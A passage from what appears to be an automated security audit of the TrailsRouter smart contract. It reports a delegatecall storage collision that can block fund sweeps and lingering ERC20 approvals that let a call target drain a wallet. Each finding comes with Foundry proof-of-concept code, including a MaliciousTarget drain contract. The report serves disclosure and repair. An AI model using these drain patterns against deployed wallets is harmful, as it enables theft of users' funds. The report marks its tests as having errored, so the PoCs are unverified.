This ensures that injectAndCall always operates on the calling wallet's balance (in delegatecall context) rather than the router implementation's own balance when invoked directly. If standalone, non-delegate use of balance injection is desired, it should go through a separate function that reads from msg.sender and not from address(this), or that uses explicit ownership or auth checks to protect any balance held on the router implementation. Additionally, consider zeroing the approval back to 0 after _injectAndExecuteCall for ERC20 tokens as a defense-in-depth measure to avoid lingering allowances.





 **Derived From** : Tstorish transient-storage flag collides with wallet storage in delegatecall context

## [M-4]. Delegatecall storage collision in TrailsRouter.validateOpHashAndSweep can brick sentinel-gated sweeps on pre-TSTORE chains

### Finding Severity Justification: The issue affects the core sentinel-gated sweep mechanism used to enforce opHash success before transferring funds. Because TrailsRouter is intended to run via delegatecall inside Sequence wallets, Tstorish’s mutable `_tstoreSupport` flag (in slot 0) aliases to the wallet’s slot 0. On chains where TSTORE/TLOAD were not supported at deployment and the router bound `_getTstorish` to the fallback function, a non-zero wallet slot 0 can cause `_getTstorishWithSloadFallback` to use `tload` instead of `sload`. This leads to either: (a) a hard invalid-opcode revert on pre‑1153 chains, or (b) reading transient storage that is never written, causing `SuccessSentinelNotSet` reverts. In both cases, `validateOpHashAndSweep` can no longer function for affected wallets, breaking protocol logic around fee and fund sweeping and potentially marooning balances or forcing unsafe manual sweeps. The impact is disruption/DoS of core protocol behavior, but does not directly enable theft or loss of user assets beyond being stuck, so it fits Code4rena’s Medium: protocol function and availability are impacted, not direct asset compromise.
## Derived From Pattern/Invariant
Tstorish transient-storage flag collides with wallet storage in delegatecall context

## Exploit Type
StorageLayout

## Location
TrailsRouter.validateOpHashAndSweep

## Finding Status: Valid
## Status Confidence: Confident
### Finding Complexity: 8
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:Permissionless


## Description
TrailsRouter inherits the Tstorish helper, which keeps a mutable boolean flag in storage slot 0 to decide whether to use transient storage (TSTORE/TLOAD) or regular storage (SSTORE/SLOAD).

In Tstorish:
- Slot 0 is occupied by the flag:
  `bool private _tstoreSupport;`
- When the chain does not support TSTORE/TLOAD at deployment, the constructor sets `_tstoreInitialSupport = false` and assigns the function pointer `_getTstorish` to `_getTstorishWithSloadFallback`:
  `function _getTstorishWithSloadFallback(uint256 storageSlot) private view returns (uint256 value) { if (_tstoreSupport) { assembly { value := tload(storageSlot) } } else { assembly { value := sload(storageSlot) } } }`

TrailsRouter uses this helper to read per-op success sentinels before sweeping:
`function validateOpHashAndSweep(bytes32 opHash, address _token, address _recipient) public payable onlyDelegatecall { uint256 slot = TrailsSentinelLib.successSlot(opHash); if (_getTstorish(slot) != TrailsSentinelLib.SUCCESS_VALUE) { revert SuccessSentinelNotSet(); } sweep(_token, _recipient); }`

The intended model is:
- During deployment, Tstorish tests whether TLOAD is supported and wires `_getTstorish` to either `tload` or `sload` variants.
- Later, callers can optionally enable TSTORE via `__activateTstore()`, which flips `_tstoreSupport` from `false` to `true` in the same contract's storage slot 0.

However, TrailsRouter is not called in its own storage context. It is almost always executed via `delegatecall` from a Sequence v3 wallet. Under `delegatecall`, all storage reads/writes in TrailsRouter (including Tstorish's `_tstoreSupport`) act on the caller (the wallet) instead of the router contract. This means:
- `_tstoreSupport` is not the router's own flag anymore.
- It becomes an alias to **slot 0 of the wallet's storage**, which is used for unrelated wallet state (e.g., initialization flags, config) and is very likely non-zero.

On chains where TSTORE/TLOAD were **not supported at the time of deployment**, Tstorish's constructor sets `_tstoreInitialSupport = false` and points `_getTstorish` to `_getTstorishWithSloadFallback`. That function branches on `_tstoreSupport` to decide whether to use `tload` or `sload`.

Because `_tstoreSupport` is read from the wallet's slot 0 under delegatecall, it may be `true` even though:
- No one ever called `__activateTstore()` on the router, and
- The chain still does **not** support TSTORE/TLOAD.

Consequences:
1. If `_tstoreSupport` (i.e., wallet slot 0) is non-zero on such a pre-TSTORE chain, `_getTstorishWithSloadFallback` will execute `tload(storageSlot)` in `validateOpHashAndSweep`. On a chain that does not implement TLOAD yet, this is an **invalid opcode**, so any call to `validateOpHashAndSweep` will revert hard when trying to read the sentinel, before even comparing it to `SUCCESS_VALUE`.
2. Even on a chain that later upgrades to support TSTORE/TLOAD, the collision means `_getTstorishWithSloadFallback` may read from transient storage via `tload`, while other components (e.g., shim or external code) may have written the sentinel using `sstore` into regular storage. In that case `_getTstorish(slot)` returns `0` even when a persistent sentinel is set to `SUCCESS_VALUE`, so `validateOpHashAndSweep` reverts with `SuccessSentinelNotSet()` even though the prior operation actually succeeded.

Because the router is intended to be used **only via delegatecall** from Sequence wallets (enforced by `onlyDelegatecall`), this storage alias is not an edge case—it is the normal execution path. And the `_tstoreSupport` flag can never be fixed from Trails' side: `__activateTstore()` is guarded by `msg.sender == tx.origin` and, when invoked directly, only modifies the router's own slot 0, not the wallet's slot 0 that actually controls the branch in delegatecall context.

Net effect:
- For wallets whose storage slot 0 is non-zero on a pre-TSTORE chain, **any** attempt to use `validateOpHashAndSweep` will revert (either via invalid opcode or a permanent `SuccessSentinelNotSet`), regardless of whether the sentinel was correctly set.
- This breaks the invariant that fees or bridged funds guarded by `opHash` can always be swept once the shim marks the op as successful, effectively DoSing sentinel-gated sweeps for those wallets and leaving balances stuck or requiring unsafe manual workarounds (e.g., calling `sweep` without sentinel checks).

## Impact
On chains where TSTORE/TLOAD were not supported when TrailsRouter was deployed and Tstorish therefore wired `_getTstorish` to `_getTstorishWithSloadFallback`, any Sequence wallet whose storage slot 0 is non‑zero can cause `validateOpHashAndSweep` to become unusable when the Router is delegatecalled. Under delegatecall, Tstorish’s `_tstoreSupport` flag aliases to the wallet’s storage slot 0. If that slot is non‑zero, `_getTstorishWithSloadFallback` takes the `tload` branch even though the chain did not yet support EIP‑1153 at deployment. On those pre‑1153 chains, this results in an INVALID‑opcode revert whenever `validateOpHashAndSweep` tries to read the sentinel, permanently preventing sentinel‑gated sweeps for that wallet. Even on chains that later upgrade to support TSTORE/TLOAD, the same storage collision can cause `validateOpHashAndSweep` to read transient storage via `tload` while the shim or other code wrote the sentinel via `sstore`, so the check sees `0` instead of `SUCCESS_VALUE` and reverts with `SuccessSentinelNotSet` for ops that actually succeeded. In both cases, flows that rely on `validateOpHashAndSweep` (e.g., conditional fee or bridged‑fund sweeps) can be DoS’d for affected wallets, marooning funds in the wallet context or forcing operators to bypass the sentinel check, but without enabling an attacker to steal funds outright.

## Command to Run Test


## Proof of Concept
Below is a revised PoC scenario that clearly separates the two problematic behaviors.

1. **Setup (pre‑TSTORE deployment assumptions):**
   - TrailsRouter is deployed on a chain that did not support EIP‑1153 at the time of deployment. In the Tstorish constructor, `_testTload` fails, `_tstoreInitialSupport` is set to `false`, and `_getTstorish` is bound to `_getTstorishWithSloadFallback`.
   - Sequence v3 wallet contracts use storage slot `0` for some internal flag (e.g., `initialized = true`), so slot 0 is non‑zero for normal deployed wallets.

2. **Normal protocol usage:**
   - A user has a Sequence wallet `W` on that chain and constructs a Trails intent whose destination‑chain leg uses `TrailsRouterShim.handleSequenceDelegateCall` to eventually call `validateOpHashAndSweep(opHash, token, recipient)` via `delegatecall`.
   - Earlier in the flow, the shim (or other Trails component) marks `opHash` as successful by writing `SUCCESS_VALUE` to the slot `S = TrailsSentinelLib.successSlot(opHash)`. On pre‑1153 chains, this write is done using `sstore` (either directly or via `_setTstorishWithSstoreFallback` while `_tstoreSupport` is still `false`).

3. **Delegatecall from wallet:**
   - When the wallet later executes the sweep leg, it calls into the shim, which `delegatecall`s `TrailsRouter.validateOpHashAndSweep(opHash, token, recipient)` in the *wallet’s* storage context.
   - Inside `validateOpHashAndSweep`, the Router computes `slot = TrailsSentinelLib.successSlot(opHash)` and calls `_getTstorish(slot)`. Because `_tstoreInitialSupport` was `false`, this is `_getTstorishWithSloadFallback`.

4. **Storage collision under delegatecall:**
   - `_getTstorishWithSloadFallback` checks `_tstoreSupport`. Under delegatecall, `_tstoreSupport` is not the Router’s own flag; it aliases to `W.slot0`. Since the wallet’s slot 0 is non‑zero (e.g., `initialized = true`), `_tstoreSupport` is effectively `true` even though `__activateTstore()` was never called on the Router and the chain may not support EIP‑1153.

5. **Behavior A – pre‑1153 chain (hard INVALID‑opcode revert):**
   - On a chain that does **not** implement `tload` at all, `_getTstorishWithSloadFallback` executes `tload(slot)` due to the aliased `_tstoreSupport == true`.
   - `tload` is an unknown opcode, so the EVM throws an INVALID‑opcode exception and reverts the entire call to `validateOpHashAndSweep` before any comparison to `SUCCESS_VALUE` occurs.
   - For this wallet `W` on this chain, *every* subsequent attempt to use `validateOpHashAndSweep` will hit the same INVALID opcode, permanently bricking sentinel‑gated sweeps for any `opHash`.

6. **Behavior B – post‑upgrade EIP‑1153 chain (logical DoS):**
   - Suppose the chain later upgrades and now supports `tstore/tload`. For already‑deployed contracts where `_tstoreInitialSupport` was `false`, `_getTstorish` still points to `_getTstorishWithSloadFallback` and no one has called `__activateTstore()` in the wallet’s storage context.
   - The shim or other Trails component may continue to set the success sentinel using `sstore` (or Tstorish with `_tstoreSupport == false` in the wallet context), writing `SUCCESS_VALUE` into *persistent* storage at slot `S`.
   - When `validateOpHashAndSweep` runs via delegatecall, `_getTstorishWithSloadFallback` again sees `_tstoreSupport` as `true` (because it reads `W.slot0`) and executes `tload(S)`. Unless some prior code has explicitly written to transient slot `S` with `tstore`, `tload(S)` returns `0`.
   - As a result, `_getTstorish(S) != SUCCESS_VALUE` and `validateOpHashAndSweep` reverts with `SuccessSentinelNotSet()` **even though** the sentinel in persistent storage indicates success. Any flow that depends on this check cannot complete for that wallet.

7. **Why this is not fixable from TrailsRouter:**
   - `TrailsRouter` is intended to be used only via `delegatecall` (`onlyDelegatecall`), so all its storage reads happen in the wallet’s storage, not its own.
   - `__activateTstore()` is restricted to `msg.sender == tx.origin` and, when called directly on the Router implementation, only flips the Router’s own `_tstoreSupport` flag, not the wallet’s slot 0. There is no safe way for the TrailsRouter or shim to correct the aliased flag in each wallet.
   - Thus, once deployed under these conditions, affected wallets can have their `validateOpHashAndSweep` leg permanently DoS’d by the storage collision.

## Proof of Code
pragma solidity ^0.8.30;

import "forge-std/Test.sol";
import "src/TrailsRouter.sol";
import "src/libraries/TrailsSentinelLib.sol";

/// @dev Mock Sequence-like wallet that delegatecalls into TrailsRouter and has
///      a non-zero value at storage slot 0 to collide with Tstorish._tstoreSupport.
contract MockSequenceWallet {
    // Occupies storage slot 0 with a non-zero value so that under delegatecall
    // Tstorish's `_tstoreSupport` reads as `true`.
    bool public slot0Flag = true;

    TrailsRouter public router;

    constructor(TrailsRouter _router) {
        router = _router;
    }

    /// @dev Simulate the shim (or other Trails component) setting the success
    ///      sentinel using SSTORE into *persistent* storage.
    function setSuccessSentinel(bytes32 opHash) external {
        uint256 slot = TrailsSentinelLib.successSlot(opHash);
        assembly {
            sstore(slot, 1)
        }
    }

    /// @dev Delegatecall into the router's validateOpHashAndSweep in the wallet
    ///      storage context. Any revert is bubbled up.
    function callValidateOpHashAndSweep(bytes32 opHash, address token, address recipient) external {
        (bool ok, bytes memory data) = address(router).delegatecall(
            abi.encodeWithSelector(
                TrailsRouter.validateOpHashAndSweep.selector,
                opHash,
                token,
                recipient
            )
        );
        if (!ok) {
            assembly {
                revert(add(data, 0x20), mload(data))
            }
        }
    }

    receive() external payable {}
}

contract TrailsRouterStorageCollisionTest is Test {
    TrailsRouter router;
    MockSequenceWallet wallet;
    address recipient = address(0xBEEF);

    function setUp() public {
        // Deploy the real TrailsRouter implementation.
        router = new TrailsRouter();

        // Deploy a mock Sequence wallet that will delegatecall into the router
        // and has slot0 != 0 so `_tstoreSupport` appears true in its context.
        wallet = new MockSequenceWallet(router);

        // Give the wallet some native balance so sweep() has something to send.
        vm.deal(address(wallet), 1 ether);
    }

    function testStorageCollisionCausesValidateOpHashAndSweepRevert() public {
        // Arrange: mock that the shim has already marked `opHash` as successful
        // by writing SUCCESS_VALUE into the wallet's *persistent* storage via
        // SSTORE (no transient storage usage).
        bytes32 opHash = keccak256("op");
        wallet.setSuccessSentinel(opHash);

        // Assumption for this test:
        // - In the deployed binary, Tstorish detected no TSTORE support at
        //   deployment time and wired `_getTstorish` to
        //   `_getTstorishWithSloadFallback`.
        // - Under delegatecall, `_getTstorishWithSloadFallback` will see
        //   `_tstoreSupport` as true (wallet.slot0Flag) and thus execute
        //   `tload(slot)` instead of `sload(slot)`.
        //
        // On real pre-1153 chains this would be an INVALID opcode; on
        // EIP-1153-capable chains (like Foundry's default EVM), `tload` will
        // read transient storage (which was never written) and return 0,
        // causing `SuccessSentinelNotSet()` to be raised.

        vm.prank(address(0x1234));
        vm.expectRevert(TrailsRouter.SuccessSentinelNotSet.selector);
        wallet.callValidateOpHashAndSweep(opHash, address(0), recipient);
    }
}


## Suggested Mitigation
The core issue is the use of a mutable storage flag (`_tstoreSupport` in slot 0) inside a contract that is intended to be executed via `delegatecall`, where its storage is shared with arbitrary caller layouts. To fully eliminate the vulnerability:

1. **Remove mutable storage from the delegatecalled Tstorish logic**
   - Do not use any per-contract storage flags (like `_tstoreSupport`) inside contracts that are meant to be delegatecalled (e.g., `TrailsRouter`). Under delegatecall these flags alias into the caller’s storage and can no longer be controlled by the Router.
   - Instead, decide TSTORE/TLOAD usage at deployment time and store that decision in **immutable** variables or constants that live in the implementation’s own code, not in shared storage.

2. **Make the TSTORE/TLOAD decision purely immutable**
   - Replace:
     - `bool private _tstoreSupport;`
     - `bool private immutable _tstoreInitialSupport;`
     - and the "with SSTORE/SLOAD fallback" functions that branch on `_tstoreSupport`.
   - With:
     - A single `immutable bool _tstoreSupportedFromDeploy;` computed in the constructor via `_testTload`, and
     - Two internal immutable function pointers bound **only** based on `_tstoreSupportedFromDeploy`:
       - If `true`: `_getTstorish = _getTstore; _setTstorish = _setTstore; _clearTstorish = _clearTstore;`
       - If `false`: `_getTstorish = _getSstore; _setTstorish = _setSstore; _clearTstorish = _clearSstore;` where the `S*` variants use `sload`/`sstore` unconditionally.
   - Remove the runtime `_tstoreSupport` flag and the `if (_tstoreSupport) { tload } else { sload }` branches entirely, so `validateOpHashAndSweep` behavior does not depend on any storage slot of the caller.

3. **Remove or restrict `__activateTstore()` for delegatecalled contracts**
   - Either delete `__activateTstore()` from Tstorish when used in delegatecalled contexts, or ensure that any activation mechanism does not rely on writing to shared storage (e.g., it could be kept only in non-delegatecalled contracts, or be compiled out entirely for TrailsRouter).
   - If dynamic activation is still desired in other contexts, use a separate Tstorish variant that is **never** inherited by contracts meant for delegatecall.

4. **Keep sentinel storage consistent**
   - For `TrailsRouter` and any shim/wallet code that reads/writes sentinel slots, always use the same mechanism (either always persistent `sstore/sload` or always transient `tstore/tload`), determined by an immutable flag set at deployment of that binary.
   - Avoid mixing `sstore` and `tstore` for the same sentinel slots across different components.

With these changes, `_getTstorish` and related helpers no longer read any mutable flag from storage, cannot be influenced by the caller’s layout under delegatecall, and `validateOpHashAndSweep` will have deterministic behavior that does not depend on wallet storage contents.





 **Derived From** : Balance injection leaves lingering ERC20 approvals from wallet to arbitrary targets

## [H-5]. Balance injection in TrailsRouter._injectAndExecuteCall leaves wallet-wide ERC20 allowance to arbitrary targets, enabling unauthorized drains

### Finding Severity Justification: The router’s balance‑injection path for ERC20 tokens (`_injectAndExecuteCall`) uses `SafeERC20.forceApprove(erc20, target, callerBalance)` from the caller context and never clears the resulting allowance. In delegatecall usage (the intended Sequence wallet context), `callerBalance` is the wallet’s entire token balance, and `target` is fully route/user‑controlled. After a single legitimate inject‑and‑call, `target` permanently holds an allowance to pull up to `callerBalance` from the wallet via `transferFrom`, including future deposits, with no further user signature or intent. The PoC shows an arbitrary contract being called once for a benign function then later draining all funds using the lingering allowance. This is a direct, realistic loss of all assets of that token for the wallet or for the router when used standalone, so the impact is full fund theft, which fits High severity under the rubric.
## Derived From Pattern/Invariant
Balance injection leaves lingering ERC20 approvals from wallet to arbitrary targets

## Exploit Type
AuthByPass

## Location
TrailsRouter._injectAndExecuteCall

## Finding Status: Valid
## Status Confidence: VeryConfident
### Finding Complexity: 5
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:Permissionless


## Description
In TrailsRouter._injectAndExecuteCall the ERC20 branch grants an allowance from the calling context (the Sequence wallet when delegatecalled) to an arbitrary target equal to the caller's full token balance, and never revokes it.

Relevant code (simplified):

function _injectAndExecuteCall(
    address token,
    address target,
    bytes memory callData,
    uint256 amountOffset,
    bytes32 placeholder,
    uint256 callerBalance
) internal {
    ...
    if (token == address(0)) {
        (bool success, bytes memory result) = target.call{value: callerBalance}(callData);
        emit BalanceInjectorCall(token, target, placeholder, callerBalance, amountOffset, success, result);
        if (!success) revert TargetCallFailed(result);
    } else {
        IERC20 erc20 = IERC20(token);
        SafeERC20.forceApprove(erc20, target, callerBalance);

        (bool success, bytes memory result) = target.call(callData);
        emit BalanceInjectorCall(token, target, placeholder, callerBalance, amountOffset, success, result);
        if (!success) revert TargetCallFailed(result);
    }
}

When TrailsRouter is used as a delegated extension (the main intended mode), all of its code executes in the storage context of the Sequence v3 wallet (or any caller contract) via delegatecall. In that context, callerBalance is computed as _getSelfBalance(token), i.e. the entire ERC20 balance of the wallet contract. SafeERC20.forceApprove is then executed as the wallet, setting allowance(wallet, target) = callerBalance.

Critically, this allowance is never reduced or cleared after target.call(callData) returns. The target is fully user/route-controlled via injectAndCall and injectSweepAndCall, and in the Trails architecture is chosen by an off-chain route builder. Once such a target has been called, it permanently retains the allowance and can later invoke token.transferFrom(wallet, attacker, amount) without going through the Sequence / Trails intent authorization flow.

Because ERC20 allowances apply to future balances, the target can drain not only any leftover tokens that remained in the wallet after the orchestrated call, but also any tokens deposited to the wallet later, up to callerBalance. This effectively bypasses the Merkle-tree based authorization boundary that Trails is meant to enforce: after a single authorized call, the target now has a standing line of credit against the user's wallet that it can exercise in arbitrary future transactions.

The same pattern also applies when injectSweepAndCall is used directly: in that case the allowance is from the TrailsRouter contract to the target, and any user funds left in the router (for example if the target only partially transfers them) can be stolen later via transferFrom.

This is an authorization bypass: a third-party contract that was only supposed to receive funds as part of a specific, Merkle-committed route instead acquires ongoing authority to move tokens from the wallet (or router) outside of the Trails/Sequence auth model.

## Impact
Any contract that has ever been used as a balance-injection target (via injectAndCall in delegatecall context or injectSweepAndCall in standalone mode) obtains an ERC20 allowance equal to the caller's full token balance at call time. Because this allowance is never revoked, a malicious or later-compromised target can at any time steal current and future balances of that token from the Sequence wallet (or from the TrailsRouter when used directly) by calling transferFrom, without any new user signature or intent. This can lead to complete loss of all ERC20 funds of affected tokens for the user wallet, and theft of funds temporarily held in the router.

## Command to Run Test


## Proof of Concept
1. Deploy TrailsRouter and a wallet-like contract that uses the router as a delegated extension (mimicking a Sequence v3 wallet). The wallet exposes a function that delegatecalls TrailsRouter.handleSequenceDelegateCall, which in turn routes to _injectAndCallDelegated and then _injectAndExecuteCall.

2. Deploy a standard ERC20 token and mint some amount (e.g. 100 tokens) to the wallet contract.

3. Deploy a MaliciousTarget contract with two functions:
   - doNothing(): a no-op used as the initial target call
   - drain(token, from, to, amount): calls ERC20(token).transferFrom(from, to, amount)

4. From an EOA representing the user/relayer, call wallet.execInjectAndCall(token, MaliciousTarget, abi.encodeWithSelector(doNothing.selector), 0, 0). This triggers:
   - router.handleSequenceDelegateCall() in delegatecall context
   - router._injectAndCallDelegated(), which computes callerBalance = _getSelfBalance(token) (wallet’s full balance)
   - router._injectAndExecuteCall(), which executes as the wallet and calls SafeERC20.forceApprove(token, MaliciousTarget, callerBalance), then calls MaliciousTarget.doNothing().

5. After this transaction:
   - token.balanceOf(wallet) is still 100 tokens, because MaliciousTarget.doNothing() did not transfer any tokens.
   - token.allowance(wallet, MaliciousTarget) is 100, set by forceApprove and never cleared.

6. Later, an attacker calls MaliciousTarget.drain(token, wallet, attackerEOA, 100). Inside drain, MaliciousTarget calls token.transferFrom(wallet, attackerEOA, 100). Because the allowance from step 4 is still present, the transfer succeeds, draining all 100 tokens from the wallet to the attacker.

7. This second transaction never touches the Sequence wallet code or the TrailsRouter again and requires no new user intent or signature. The lingering approval granted in the original balance injection has provided a permanent authorization channel for the target to bypass the Trails/Sequence authorization boundary and steal funds.

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.30;

import "forge-std/Test.sol";
import {TrailsRouter} from "src/TrailsRouter.sol";
import {ITrailsRouter} from "src/interfaces/ITrailsRouter.sol";
import {ERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";

contract TestToken is ERC20 {
    constructor() ERC20("TestToken", "TT") {
        _mint(msg.sender, 1_000_000 ether);
    }

    function mint(address to, uint256 amount) external {
        _mint(to, amount);
    }
}

contract WalletLike {
    address public router;

    constructor(address _router) {
        router = _router;
    }

    function execInjectAndCall(
        address token,
        address target,
        bytes memory callData,
        uint256 amountOffset,
        bytes32 placeholder
    ) external {
        // Mimic Sequence delegated extension call
        bytes memory dataForRouter = abi.encodeWithSelector(
            ITrailsRouter.handleSequenceDelegateCall.selector,
            bytes32(uint256(0x1234)),
            uint256(0),
            uint256(0),
            uint256(1),
            uint256(0),
            abi.encodeWithSelector(
                ITrailsRouter.injectAndCall.selector,
                token,
                target,
                callData,
                amountOffset,
                placeholder
            )
        );

        (bool ok, bytes memory ret) = router.delegatecall(dataForRouter);
        require(ok, string(ret));
    }
}

contract MaliciousTarget {
    function doNothing() external {}

    function drain(address token, address from, address to, uint256 amount) external {
        ERC20(token).transferFrom(from, to, amount);
    }
}

contract TrailsRouter_ApprovalAuthBypassTest is Test {
    TrailsRouter router;
    TestToken token;
    WalletLike wallet;
    MaliciousTarget target;
    address attacker;

    function setUp() public {
        router = new TrailsRouter();
        token = new TestToken();
        wallet = new WalletLike(address(router));
        target = new MaliciousTarget();
        attacker = address(0xBEEF);

        // Fund the wallet with tokens
        token.mint(address(wallet), 100 ether);
    }

    function test_MaliciousTargetCanDrainWalletAfterInjectAndCall() public {
        uint256 initialWalletBal = token.balanceOf(address(wallet));
        assertEq(initialWalletBal, 100 ether);

        // Prepare call data: invoke MaliciousTarget.doNothing()
        bytes memory callData = abi.encodeWithSelector(target.doNothing.selector);

        // Simulate legitimate Trails path: wallet delegatecalls into router,
        // which in turn sets allowance from wallet to target
        wallet.execInjectAndCall(address(token), address(target), callData, 0, bytes32(0));

        // Router has granted target an allowance equal to wallet's full balance.
        uint256 allowanceAfter = token.allowance(address(wallet), address(target));
        assertEq(allowanceAfter, initialWalletBal);

        // Wallet balance is unchanged because target.didNothing
        assertEq(token.balanceOf(address(wallet)), initialWalletBal);

        // Later, attacker triggers target to steal funds using lingering allowance
        vm.prank(attacker);
        target.drain(address(token), address(wallet), attacker, initialWalletBal);

        // Attacker gained all wallet tokens without any further wallet authorization
        assertEq(token.balanceOf(attacker), initialWalletBal);
        assertEq(token.balanceOf(address(wallet)), 0);
    }
}


## Suggested Mitigation
In the ERC20 branch of _injectAndExecuteCall, ensure that any allowance granted to the target is strictly scoped to the lifetime of that call and is cleared afterwards. A straightforward fix is to reset the allowance back to zero after the external call, so no residual approval remains:

if (token == address(0)) {
    (bool success, bytes memory result) = target.call{value: callerBalance}(callData);
    emit BalanceInjectorCall(...);
    if (!success) revert TargetCallFailed(result);
} else {
    IERC20 erc20 = IERC20(token);
    SafeERC20.forceApprove(erc20, target, callerBalance);

    (bool success, bytes memory result) = target.call(callData);

    // Always clear the allowance after the call to avoid lingering approvals
    SafeERC20.forceApprove(erc20, target, 0);

    emit BalanceInjectorCall(...);
    if (!success) revert TargetCallFailed(result);
}

Because reverting the call reverts state changes, the pre-call forceApprove does not need special handling on the failure path; the main requirement is to clear the allowance on the success path. For additional hardening, consider avoiding approvals altogether in the delegatecall context by switching to a push-based transfer model (wallet/router transfers tokens directly to the intended recipient) instead of relying on the target to pull them with transferFrom, so that the Sequence/Trails auth boundary is never delegated via ERC20 approval.



